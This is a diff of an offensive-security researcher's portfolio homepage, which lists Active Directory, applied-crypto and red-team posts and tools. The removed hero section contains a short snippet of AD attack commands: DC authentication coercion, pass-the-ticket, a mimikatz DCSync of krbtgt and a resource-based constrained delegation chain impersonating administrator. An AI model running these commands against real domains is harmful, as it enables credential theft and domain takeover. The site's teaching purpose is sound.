@@ -1,242 +1,226 @@
-sive <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>sparwol // offensive security</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<title>sparwol — Sean Parrott-Wolfe</title>
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
 <nav>
-  <a class="nav-id" href="index.html">sparwol.com<span class="cursor"></span></a>
+  <a class="nav-id" href="index.html">sparwol<span class="cursor"></span></a>
   <ul class="nav-links">
     <li><a href="posts.html">posts</a></li>
-    <li><a href="#tools">tools</a></li>
+    <li><a href="tools/index.html">tools</a></li>
     <li><a href="#about">about</a></li>
     <li><a href="mailto:sean@sparwol.com">contact</a></li>
   </ul>
 </nav>
 
-<section class="hero" id="home">
-  <div class="hero-grid"></div>
-  <p class="hero-prompt"><span>~/sparwol</span> $ whoami</p>
-  <h1>Offensive<br>security.<br><em>Documented.</em></h1>
-  <div class="hero-tags">
-    <span class="tag hot">Red Team</span>
-    <span class="tag hot">Active Directory</span>
-    <span class="tag hot">Physical Security</span>
-    <span class="tag">OSINT</span>
-    <span class="tag">Applied Cryptography</span>
-    <span class="tag">Network Pentesting</span>
-    <span class="tag">Web App &amp; API</span>
-    <span class="tag">Cloud &amp; IoT</span>
-    <span class="tag">Lock Bypass</span>
+<div class="site-intro">
+  <div class="intro-name">Sean Parrott-Wolfe</div>
+  <p class="intro-statement">
+    Offensive security research. Two things I go deep on: <strong style="color:var(--acc2);font-weight:500">Active Directory and identity attacks</strong>,
+    and <strong style="color:#5a9ac0;font-weight:500">applied cryptographic attacks</strong> — the implementation failures, not the broken math.
+    Plus red team tradecraft from the work itself.
+  </p>
+  <div class="intro-meta">
+    <span>Addison, Maine</span>
+    <span class="intro-sep">·</span>
+    <span>Deer Brook Technical Services</span>
+    <span class="intro-sep">·</span>
+    <a href="mailto:sean@sparwol.com">sean@sparwol.com</a>
+    <span class="intro-sep">·</span>
+    <a href="https://github.com/sparwol" target="_blank" rel="noopener">github/sparwol</a>
+    <span class="intro-sep">·</span>
+    <a href="https://twitter.com/0xsparwol" target="_blank" rel="noopener">@0xsparwol</a>
   </div>
-  <p class="hero-desc">Writeups, tools, and research on offensive security tradecraft. Offensive Security Researcher, Penetration Tester, Red Teamer.</p>
-  <div class="hero-stats">
-    <div class="stat-item">
-      <div class="stat-num">30<span style="font-size:1rem;color:var(--dim)">yrs</span></div>
-      <div class="stat-label">in the craft</div>
+</div>
+
+<div class="currently-bar">
+  <span class="now-label">// currently</span>
+  <div class="now-items">
+    <span class="now-item">
+      <span class="now-key">studying</span>
+      <span class="now-val">CRTO — Cobalt Strike &amp; C2 tradecraft</span>
+    </span>
+    <span class="now-item">
+      <span class="now-key">writing</span>
+      <span class="now-val"><a href="posts/algorithm-isnt-the-target.html">crypto implementation attack catalog</a></span>
+    </span>
+    <span class="now-item">
+      <span class="now-key">researching</span>
+      <span class="now-val"><a href="posts/entra-id-attacks.html">Entra ID / hybrid identity attack paths</a></span>
+    </span>
+  </div>
+</div>
+
+<!-- AD & IDENTITY -->
+<section class="sec" id="ad-identity">
+  <div class="sec-header">
+    <span class="sec-label">ad &amp; identity</span>
+    <a class="sec-link" href="posts.html">all posts</a>
+  </div>
+  <div class="work-grid">
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-id">AD &amp; Identity</span><span class="work-status status-published">published</span></div>
+      <h3><a href="posts/kerberos-delegation-abuse.html">Kerberos Delegation Abuse: Unconstrained, Constrained, and RBCD</a></h3>
+      <p>Escalating to Domain Admin by exploiting a feature working exactly as designed. Full attack chains for all three delegation types, the /altservice bypass, and a real engagement narrative.</p>
+      <div class="work-card-foot"><span class="work-date">2024-12-10</span><span class="arc-time">10 min</span></div>
     </div>
-    <div class="stat-item">
-      <div class="stat-num">4</div>
-      <div class="stat-label">published posts</div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-id">AD &amp; Identity</span><span class="work-status status-wip">in progress</span></div>
+      <h3><a href="posts/entra-id-attacks.html">Entra ID and the Hybrid Identity Attack Surface</a></h3>
+      <p>On-prem AD attacks are well documented. The hybrid join, Primary Refresh Tokens, and Seamless SSO are where the field is moving — and where the next generation of identity attacks live.</p>
+      <div class="work-card-foot"><span class="work-date">in progress</span><span class="arc-time">draft</span></div>
     </div>
-    <div class="stat-item">
-      <div class="stat-num">∞</div>
-      <div class="stat-label">rabbit holes</div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-id">AD &amp; Identity</span><span class="work-status status-published">published</span></div>
+      <h3><a href="posts/identity-attack-surface.html">Identity Is the Attack Surface</a></h3>
+      <p>Modern enterprises don't get breached through unpatched software. How credential abuse, token theft, and delegation misuse replaced exploit chains as the primary attack vector.</p>
+      <div class="work-card-foot"><span class="work-date">2024-11-12</span><span class="arc-time">10 min</span></div>
     </div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-id">AD &amp; Identity</span><span class="work-status status-published">published</span></div>
+      <h3><a href="posts/kerberos-delegation-defense.html">Why Your Kerberos Delegation Config Is a Privilege Escalation Path</a></h3>
+      <p>What attackers see when they look at delegation, why it bypasses PAWs and MFA, and a week-by-week remediation plan with BloodHound queries and PowerShell audit commands.</p>
+      <div class="work-card-foot"><span class="work-date">2024-11-28</span><span class="arc-time">9 min</span></div>
+    </div>
+
   </div>
 </section>
 
-<!-- POSTS -->
-<section class="sec" id="posts">
+<!-- APPLIED CRYPTO -->
+<section class="sec" id="crypto">
   <div class="sec-header">
-    <span class="sec-label">latest posts</span>
-    <a class="sec-link" href="posts.html">all posts</a>
+    <span class="sec-label">applied cryptographic attacks</span>
   </div>
+  <div class="work-grid">
 
-  <div class="featured-post">
-    <div class="feat-body">
-      <div class="feat-meta">
-        <span class="post-cat cat-ad">Active Directory</span>
-        <span class="post-date">2024-12-10</span>
-      </div>
-      <h2><a href="posts/kerberos-delegation-abuse.html">Kerberos Delegation Abuse: Unconstrained, Constrained, and RBCD</a></h2>
-      <p>How to escalate to Domain Admin by exploiting a feature that's working exactly as designed. Covers all three delegation types, the S4U extension abuse, the /altservice bypass, and a full RBCD attack chain — with a real engagement narrative at the end.</p>
-      <a class="read-link" href="posts/kerberos-delegation-abuse.html">Read writeup</a>
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-crypto">Applied Crypto</span><span class="work-status status-wip">in progress</span></div>
+      <h3><a href="posts/algorithm-isnt-the-target.html">The Algorithm Isn't the Target</a></h3>
+      <p>AES isn't broken — implementations are. A field catalog of crypto attacks that actually land: CBC padding oracles, GCM nonce reuse, ECB detection, JWT alg confusion, predictable IVs, and keys that should never have been keys.</p>
+      <div class="work-card-foot"><span class="work-date">in progress</span><span class="arc-time">draft</span></div>
     </div>
-    <div class="feat-code">
-      <pre>
-<span class="cm"># monitor for TGTs on unconstrained host</span>
-<span class="bright">Rubeus</span>.exe <span class="fn">monitor</span> <span class="var">/interval</span>:5 <span class="var">/filteruser</span>:DC01$
 
-<span class="cm"># force DC to authenticate (Print Spooler)</span>
-<span class="bright">SpoolSample</span>.exe DC01.corp.local CITRIX-APP-01
-
-<span class="cm"># pass captured TGT → DCSync</span>
-<span class="bright">Rubeus</span>.exe <span class="fn">ptt</span> <span class="var">/ticket</span>:[base64]
-<span class="bright">mimikatz</span> <span class="str">"lsadump::dcsync /user:krbtgt"</span>
-
-<span class="cm"># RBCD: write your own delegation</span>
-<span class="bright">impacket-addcomputer</span> <span class="var">-computer-name</span> <span class="str">'ATTACK$'</span> \
-  <span class="var">-computer-pass</span> <span class="str">'P@ss!'</span> corp.local/user:pass
-
-<span class="bright">Rubeus</span>.exe <span class="fn">s4u</span> <span class="var">/user</span>:ATTACK$ <span class="var">/rc4</span>:HASH \
-  <span class="var">/impersonateuser</span>:administrator \
-  <span class="var">/msdsspn</span>:cifs/target.corp.local <span class="var">/ptt</span></pre>
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-crypto">Applied Crypto</span><span class="work-status status-wip">in progress</span></div>
+      <h3><a href="posts/harvest-now-decrypt-later.html">Harvest Now, Decrypt Later</a></h3>
+      <p>The offensive reframe of the post-quantum threat. Exfiltrated ciphertext of long-lived secrets is already a win — you don't need to decrypt today. Why "the data was encrypted" isn't a clean mitigation.</p>
+      <div class="work-card-foot"><span class="work-date">in progress</span><span class="arc-time">draft</span></div>
     </div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-crypto">Applied Crypto</span><span class="work-status status-wip">in progress</span></div>
+      <h3><a href="posts/crypto-posture-recon.html">Cryptographic Posture as Reconnaissance</a></h3>
+      <p>An organisation's TLS versions, cipher suites, certificate practices, and crypto-agility are an attack surface map. Crypto debt is a recon signal — and it points at the long-game targets.</p>
+      <div class="work-card-foot"><span class="work-date">in progress</span><span class="arc-time">draft</span></div>
+    </div>
+
   </div>
+</section>
 
-  <div class="post-grid">
-    <div class="post-card">
-      <div class="feat-meta">
-        <span class="post-cat cat-defense">Defense</span>
-        <span class="post-date">2024-11-28</span>
-      </div>
-      <h3><a href="posts/kerberos-delegation-defense.html">Why Your Kerberos Delegation Config Is a Privilege Escalation Path</a></h3>
-      <p>What red teamers find when they look at delegation, why it bypasses PAWs and MFA, and a week-by-week remediation plan that actually works.</p>
-      <div class="post-tags">
-        <span class="ptag">Active Directory</span>
-        <span class="ptag">Kerberos</span>
-        <span class="ptag">hardening</span>
-      </div>
+<!-- TRADECRAFT -->
+<section class="sec" id="tradecraft">
+  <div class="sec-header">
+    <span class="sec-label">red team tradecraft</span>
+  </div>
+  <div class="work-grid">
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-trade">Tradecraft</span><span class="work-status status-wip">in progress</span></div>
+      <h3><a href="posts/beacon-hygiene.html">Beacon Hygiene: Surviving Modern EDR</a></h3>
+      <p>Defeating EDR is a telemetry problem, not a signature problem. Sleep masks, in-memory evasion, BOFs vs fork-and-run, and understanding what ETW and kernel callbacks actually surface.</p>
+      <div class="work-card-foot"><span class="work-date">in progress</span><span class="arc-time">draft</span></div>
     </div>
-    <div class="post-card">
-      <div class="feat-meta">
-        <span class="post-cat cat-identity">Tradecraft</span>
-        <span class="post-date">2024-11-12</span>
-      </div>
-      <h3><a href="posts/identity-attack-surface.html">Identity Is the Attack Surface</a></h3>
-      <p>Modern breaches don't exploit vulnerabilities — they exploit identity. How credential abuse, token theft, and delegation misuse replaced exploit chains as the primary attack vector.</p>
-      <div class="post-tags">
-        <span class="ptag">identity</span>
-        <span class="ptag">credentials</span>
-        <span class="ptag">tradecraft</span>
-      </div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-trade">Tradecraft</span><span class="work-status status-wip">in progress</span></div>
+      <h3><a href="posts/c2-infrastructure.html">C2 Infrastructure That Survives Contact</a></h3>
+      <p>Redirectors, malleable profiles, and the OPSEC of standing up infrastructure that stays operational after the first detection. What burns a teamserver and how to keep it from burning.</p>
+      <div class="work-card-foot"><span class="work-date">in progress</span><span class="arc-time">draft</span></div>
     </div>
-    <div class="post-card">
-      <div class="feat-meta">
-        <span class="post-cat cat-method">Methodology</span>
-        <span class="post-date">2024-10-30</span>
-      </div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-trade">Tradecraft</span><span class="work-status status-published">published</span></div>
       <h3><a href="posts/red-team-vs-pentest.html">Red Team vs Penetration Test: Understanding the Difference</a></h3>
-      <p>They're often used interchangeably — but they test fundamentally different things. A practical breakdown of objectives, scope, deliverables, and how to choose the right engagement type.</p>
-      <div class="post-tags">
-        <span class="ptag">methodology</span>
-        <span class="ptag">red team</span>
-        <span class="ptag">pentest</span>
-      </div>
+      <p>They test fundamentally different things. Objectives, scope, deliverables, and how to decide which engagement type fits your organisation's security maturity.</p>
+      <div class="work-card-foot"><span class="work-date">2024-10-30</span><span class="arc-time">11 min</span></div>
     </div>
+
   </div>
 </section>
 
 <!-- TOOLS -->
 <section class="sec" id="tools">
   <div class="sec-header">
-    <span class="sec-label">tools &amp; projects</span>
-    <a class="sec-link" href="https://github.com/">github</a>
+    <span class="sec-label">tools</span>
+    <a class="sec-link" href="tools/index.html">all tools</a>
   </div>
-  <div class="tools-grid">
-    <div class="tool-card">
-      <div class="tool-header">
-        <span class="tool-name">ad-enum-helper</span>
-        <span class="tool-lang">Python</span>
-      </div>
-      <p>Wrapper around common AD enumeration commands. Normalises output from BloodHound, ldapdomaindump, and PowerView into a unified JSON format for easier triage.</p>
-      <div class="tool-links"><a href="#">GitHub →</a></div>
+  <div class="work-grid">
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-crypto">Applied Crypto</span><span class="work-status status-wip">in progress</span></div>
+      <h3><a href="tools/cryptorecon.html">cryptorecon</a></h3>
+      <p>Cryptographic posture scanner. Enumerates TLS versions, cipher suites, certificate practices, and crypto-agility indicators across a target's external surface. Maps crypto debt to attack surface.</p>
+      <div class="work-card-foot"><span class="work-date">Python</span></div>
     </div>
-    <div class="tool-card">
-      <div class="tool-header">
-        <span class="tool-name">osint-toolkit</span>
-        <span class="tool-lang">Python</span>
-      </div>
-      <p>Scripts for pre-engagement recon — certificate transparency log querying, ASN lookups, email pattern generation, and LinkedIn scraping utilities.</p>
-      <div class="tool-links"><a href="#">GitHub →</a></div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-crypto">Applied Crypto</span><span class="work-status status-published">published</span></div>
+      <h3><a href="https://github.com/sparwol/CryptID" target="_blank" rel="noopener">CryptID</a></h3>
+      <p>AES-based file encryption tool. Built as a practical implementation alongside applied cryptography study.</p>
+      <div class="work-card-foot"><span class="work-date">C#</span></div>
     </div>
-    <div class="tool-card">
-      <div class="tool-header">
-        <span class="tool-name">lockpick log</span>
-        <span class="tool-lang">Notes</span>
-      </div>
-      <p>A running log of lock models encountered in the field, bypass techniques used, and difficulty ratings. Reference for physical assessment planning.</p>
-      <div class="tool-links"><a href="#">View →</a></div>
+
+    <div class="work-card">
+      <div class="work-card-top"><span class="cat cat-id">AD &amp; Identity</span><span class="work-status status-published">published</span></div>
+      <h3><a href="https://github.com/sparwol/SnowWhite" target="_blank" rel="noopener">SnowWhite</a></h3>
+      <p>Web scanner for pre-engagement reconnaissance. Surface mapping, endpoint discovery, and response analysis.</p>
+      <div class="work-card-foot"><span class="work-date">Python</span></div>
     </div>
+
   </div>
 </section>
 
-<!-- CERTS 
-<section class="sec" style="padding-top:3.5rem;padding-bottom:3.5rem">
-  <div class="sec-header" style="margin-bottom:1.5rem">
-    <span class="sec-label">credentials</span>
-  </div>
-  <div class="certs-strip">
-    <div class="cert-block wip">
-      <div class="cert-id">CRTO — In Progress</div>
-      <div class="cert-name">Certified Red Team Operator</div>
-      <div class="cert-issuer">Zero Point Security</div>
-    </div>
-    <div class="cert-block">
-      <div class="cert-id">PNPT — 2022</div>
-      <div class="cert-name">Practical Network Penetration Tester</div>
-      <div class="cert-issuer">TCM Security</div>
-    </div>
-    <div class="cert-block">
-      <div class="cert-id">Sec+ — 2021</div>
-      <div class="cert-name">CompTIA Security+ SY0-601</div>
-      <div class="cert-issuer">CompTIA</div>
-    </div>
-    <div class="cert-block">
-      <div class="cert-id">MCSE/MCSA — 2007</div>
-      <div class="cert-name">Microsoft Certified Systems Engineer</div>
-      <div class="cert-issuer">Microsoft</div>
-    </div>
-  </div>
-</section>
--->
 <!-- ABOUT -->
-<section class="sec" id="about">
-  <div class="sec-header">
-    <span class="sec-label">about</span>
-  </div>
-  <div class="about-layout">
-    <div class="about-left">
-      <div class="handle">sparwol</div>
-      <div class="role">Offensive Security Researcher</div>
-      <a class="contact-btn" href="mailto:sean@sparwol.com">sean@sparwol.com</a>
-    </div>
-    <div class="about-right">
-      <p>Started editing <strong>AUTOEXEC.BAT</strong> and writing QBasic programs thirty years ago. Picked up locksmithing and lockpicking in my early teens, studied <strong>applied cryptography</strong> in college, and have been chasing the craft ever since.</p>
-      <p>Primary focus: <strong>Windows networks and Active Directory</strong>, applied cryptography, <strong>OSINT</strong>, physical security, and red team operations. This site is where I document things I've learned, built, or broken.</p>
-      <p>Available for <strong>penetration testing engagements</strong> — external/internal networks, web apps, red team operations, physical assessments, and cloud reviews.</p>
-      <div class="skills-list">
-        <span class="tag hot">Active Directory</span>
-        <span class="tag hot">Kerberoasting</span>
-        <span class="tag hot">ACL Abuse</span>
-        <span class="tag">OSINT</span>
-        <span class="tag">Lock Bypass</span>
-        <span class="tag">Applied Crypto</span>
-        <span class="tag">C2 Infrastructure</span>
-        <span class="tag">BloodHound</span>
-        <span class="tag">Burp Suite</span>
-        <span class="tag">Metasploit</span>
-        <span class="tag">Python</span>
-        <span class="tag">PowerShell</span>
-      </div>
+<div class="about-strip" id="about">
+  <div>
+    <h2>Sean Parrott-Wolfe</h2>
+    <div class="role">Offensive Security · Addison, Maine</div>
+    <div class="links">
+      <a class="about-link" href="mailto:sean@sparwol.com">sean@sparwol.com</a>
+      <a class="about-link" href="https://github.com/sparwol" target="_blank" rel="noopener">github/sparwol</a>
+      <a class="about-link" href="https://twitter.com/0xsparwol" target="_blank" rel="noopener">@0xsparwol</a>
     </div>
   </div>
-</section>
+  <div class="about-body">
+    <p>I run penetration testing and red team operations at <strong>Deer Brook Technical Services</strong>, primarily for financial sector clients in New England. Fifteen years on the Windows and Active Directory side before the pivot to offensive.</p>
+    <p>The research here focuses on three things: <strong>Active Directory and identity attacks</strong>, <strong>applied cryptographic attacks</strong> — implementation failures rather than broken algorithms — and <strong>red team tradecraft</strong>. The mathematics and theoretical physics background feeds the cryptography work directly; that's where the depth comes from.</p>
+    <p>PNPT certified, CRTO in progress. The three-year target is original published research at the level the field cites.</p>
+    <div class="about-tags">
+      <span class="atag">Active Directory</span><span class="atag">Entra ID</span>
+      <span class="atag">Kerberos</span><span class="atag">Identity Attacks</span>
+      <span class="atag">Applied Cryptography</span><span class="atag">Implementation Attacks</span>
+      <span class="atag">Post-Quantum</span><span class="atag">Red Team</span>
+      <span class="atag">C2 / EDR Evasion</span><span class="atag">OSINT</span>
+    </div>
+  </div>
+</div>
 
 <footer>
-  <span class="foot-left">© 2024 <span>sparwol.com</span> — all posts are for educational purposes</span>
+  <span class="foot-left">© 2024 <span>sparwol.com</span> — posts are for educational purposes</span>
   <nav class="foot-nav">
     <a href="posts.html">posts</a>
-    <a href="#tools">tools</a>
+    <a href="tools/index.html">tools</a>
     <a href="#about">about</a>
+    <a href="https://github.com/sparwol" target="_blank" rel="noopener">github</a>
     <a href="mailto:sean@sparwol.com">contact</a>
   </nav>
 </footer>
